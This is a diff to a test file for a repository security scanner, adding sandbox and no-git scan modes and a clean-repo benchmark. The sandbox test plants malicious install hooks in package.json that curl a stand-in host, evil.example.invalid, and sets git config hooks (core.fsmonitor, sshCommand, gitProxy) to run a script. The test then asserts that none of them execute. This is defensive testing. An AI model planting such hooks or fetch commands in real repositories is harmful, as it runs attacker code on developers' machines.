@@ -2,13 +2,13 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
-import { readFile, writeFile, symlink, mkdir } from 'node:fs/promises';
+import { readFile, writeFile, symlink, mkdir, chmod, access } from 'node:fs/promises';
 import path from 'node:path';
-import { scan, formatSarif } from '../src/index.js';
+import { scan, formatSarif, MACOS_SEATBELT_PROFILE } from '../src/index.js';
 import { formatGitHub, formatSummary } from '../src/reporters/github-actions.js';
 import { formatConsole } from '../src/reporters/console.js';
 import { validateConfig, loadConfig } from '../src/config.js';
-import { repo } from './helpers.js';
+import { repo, git } from './helpers.js';
 const exec = promisify(execFile);
 const cli = path.resolve('src/cli.ts');
 async function run(args: string[], env: Record<string, string | undefined> = {}) {
@@ -35,7 +35,7 @@ test('oversized files warn, binary files skip, disabled rules apply, reports are
   assert.deepEqual(a, b); assert.deepEqual(a.findings.map(f => f.ruleId), ['scan/skipped-file']);
 });
 test('reporters escape workflow-command and markdown injection and create valid SARIF locations', () => {
-  const report = { version: '0.1.0' as const, filesScanned: 1, summary: { error: 1, warn: 0, info: 0 }, findings: [{ ruleId: 'secret/aws', severity: 'error' as const, file: 'a,b:c%\n`|<x>.txt', line: 2, message: 'redacted\n::error::fake <img>|`', suggestion: 'Rotate.' }] };
+  const report = { version: '0.2.0' as const, filesScanned: 1, summary: { error: 1, warn: 0, info: 0 }, findings: [{ ruleId: 'secret/aws', severity: 'error' as const, file: 'a,b:c%\n`|<x>.txt', line: 2, message: 'redacted\n::error::fake <img>|`', suggestion: 'Rotate.' }] };
   const github = formatGitHub(report);
   assert.equal(github.split('\n').length, 1); assert.ok(github.includes('a%2Cb%3Ac%25%0A'));
   const summary = formatSummary(report); assert.ok(!summary.includes('<img>')); assert.ok(summary.includes('&lt;img&gt;'));
@@ -51,7 +51,7 @@ test('CLI enforces thresholds, JSON/SARIF formats and usage failures', async t =
   assert.equal((await run(['scan', root, '--fail-on', 'warn'])).code, 1);
   const sarif = await run(['scan', root, '--format', 'sarif']); assert.equal(JSON.parse(sarif.stdout).version, '2.1.0');
   for (const args of [['scan', root, '--format', 'bad'], ['scan', root, '--fail-on', 'info'], ['scan', root, '--auditor', 'bad'], ['scan', root, '--staged'], ['unknown']]) assert.equal((await run(args)).code, 2);
-  assert.equal((await run(['--help'])).code, 0); assert.equal((await run(['--version'])).stdout.trim(), '0.1.0');
+  assert.equal((await run(['--help'])).code, 0); assert.equal((await run(['--version'])).stdout.trim(), '0.2.0');
 });
 test('GitHub mode writes outputs and summary even when findings fail the gate', async t => {
   const root = await repo(t, { 'key.txt': 'AKIA' + 'Z4M8Q2W6E9R3T7Y1' });
@@ -95,4 +95,142 @@ test('A8: missing or broken git in a directory with .git metadata fails closed i
     process.env.PATH = prevPath;
   }
 });
+test('v0.2.0: OS-boundary --sandbox and --no-git zero-subprocess mode block network egress and child hooks', async t => {
+  const root = await repo(t, {
+    '.env.example': 'API_URL=https://api.example.com\n',
+    'src/app.ts': 'export const url = process.env.API_URL;\n',
+    'package.json': JSON.stringify({
+      name: 'untrusted-target',
+      scripts: {
+        preinstall: 'curl -s https://evil.example.invalid/pwn',
+        postinstall: 'curl -s https://evil.example.invalid/pwn',
+      },
+      dependencies: { yaml: '2.9.1' },
+    }),
+  });
+  const marker = path.join(root, 'hook-ran.txt');
+  const hookScript = path.join(root, 'hook.sh');
+  await writeFile(hookScript, `#!/bin/sh\necho pwned > "${marker}"\n`);
+  await chmod(hookScript, 0o755);
+  git(root, 'init', '-q');
+  git(root, 'add', '.');
+  git(root, 'config', 'core.fsmonitor', hookScript);
+  git(root, 'config', 'core.sshCommand', hookScript);
+  git(root, 'config', 'core.gitProxy', hookScript);
 
+  // 1. --sandbox CLI scan succeeds with 0 findings and never invokes hooks or package manager scripts
+  const sandboxed = await run(['scan', root, '--sandbox', '--format', 'json']);
+  assert.equal(sandboxed.code, 0, sandboxed.stderr);
+  assert.equal(JSON.parse(sandboxed.stdout).summary.error, 0);
+  await assert.rejects(access(marker), /ENOENT/);
+
+  // 2. --no-git pure filesystem scan succeeds even when PATH is empty and .git exists
+  const prevPath = process.env.PATH;
+  process.env.PATH = '';
+  try {
+    const noGitReport = await scan({ root, noGit: true });
+    assert.equal(noGitReport.summary.error, 0);
+    assert.equal(noGitReport.summary.warn, 0);
+  } finally {
+    process.env.PATH = prevPath;
+  }
+
+  // 3. On macOS, verify kernel Seatbelt profile blocks actual TCP socket egress at OS boundary
+  if (process.platform === 'darwin') {
+    await assert.rejects(
+      exec('/usr/bin/sandbox-exec', [
+        '-p',
+        MACOS_SEATBELT_PROFILE,
+        process.execPath,
+        '-e',
+        'import("node:net").then(({connect})=>{const s=connect(443,"1.1.1.1",()=>process.exit(0));s.on("error",()=>process.exit(42));});',
+      ]),
+      (err: { code?: number }) => err.code === 42,
+    );
+  }
+});
+test('v0.2.0: Golden clean-repo benchmark suite passes all 4 auditors with zero false positives', async t => {
+  const shaCheckout = '11bd71901bbe5b1630ceea73d27597364c9af683';
+  const shaNode = '49933ea5288caeca8642d1e84afbd3f7d6820020';
+  const sha256Digest = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
+
+  const cleanRoot = await repo(t, {
+    '.env.example': 'DATABASE_URL=postgres://localhost:5432/app\nREDIS_URL=redis://localhost:6379\nPORT=8080\n',
+    'docker-compose.yml': 'services:\n  api:\n    image: node:22-alpine\n    environment:\n      - DATABASE_URL=${DATABASE_URL}\n      - REDIS_URL=${REDIS_URL}\n',
+    'Dockerfile': 'FROM node:22-alpine\nENV PORT=8080\n',
+    'package.json': JSON.stringify({
+      name: 'golden-clean-repo',
+      version: '1.0.0',
+      dependencies: {
+        ignore: '7.0.5',
+        yaml: '^2.9.1',
+      },
+    }),
+    'package-lock.json': JSON.stringify({
+      name: 'golden-clean-repo',
+      lockfileVersion: 3,
+      packages: {
+        'node_modules/yaml': {
+          version: '2.9.1',
+          resolved: 'https://registry.npmjs.org/yaml/-/yaml-2.9.1.tgz',
+          integrity: 'sha512-f8Kp2Rz9Wq5Tx7La0Md3Nv6Bs1Hc4Yj9f8Kp2Rz9Wq5Tx7La0Md3Nv6Bs1Hc4Yj==',
+        },
+      },
+    }),
+    'src/index.ts': [
+      'export const db = process.env.DATABASE_URL;',
+      'export const redis = process.env.REDIS_URL;',
+      'export const port = process.env.PORT;',
+      'export const commitSha = "11bd71901bbe5b1630ceea73d27597364c9af683";',
+    ].join('\n'),
+    '.github/workflows/ci.yml': [
+      'name: Hardened CI',
+      'on: [push, pull_request]',
+      'permissions:',
+      '  contents: read',
+      'jobs:',
+      '  test:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      `      - uses: actions/checkout@${shaCheckout}`,
+      `      - uses: actions/setup-node@${shaNode}`,
+      `      - uses: docker://alpine@sha256:${sha256Digest}`,
+      '      - env:',
+      '          PR_TITLE: ${{ github.event.pull_request.title }}',
+      '          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}',
+      '        run: |',
+      '          echo "Checking PR #$(( ${{ github.event.pull_request.number }} ))"',
+      '          test -n "$PR_TITLE"',
+      '          test -n "$DEPLOY_KEY"',
+    ].join('\n'),
+    '.github/workflows/pr-labeler.yml': [
+      'name: Safe PR Target Labeler (No Checkout)',
+      'on: pull_request_target',
+      'permissions:',
+      '  pull-requests: write',
+      'jobs:',
+      '  label:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      '      - env:',
+      '          PR_NUM: ${{ github.event.pull_request.number }}',
+      '        run: echo "Labeling PR $PR_NUM"',
+    ].join('\n'),
+    '.gitlab-ci.yml': [
+      'stages: [test]',
+      `image: node:22-alpine@sha256:${sha256Digest}`,
+      'include:',
+      '  - project: "security/templates"',
+      `    ref: "${shaCheckout}"`,
+      '    file: "/templates/sast.yml"',
+      'unit_test:',
+      '  stage: test',
+      '  script:',
+      '    - npm test',
+    ].join('\n'),
+  });
+
+  const report = await scan({ root: cleanRoot });
+  assert.deepEqual(report.findings, []);
+  assert.deepEqual(report.summary, { error: 0, warn: 0, info: 0 });
+});
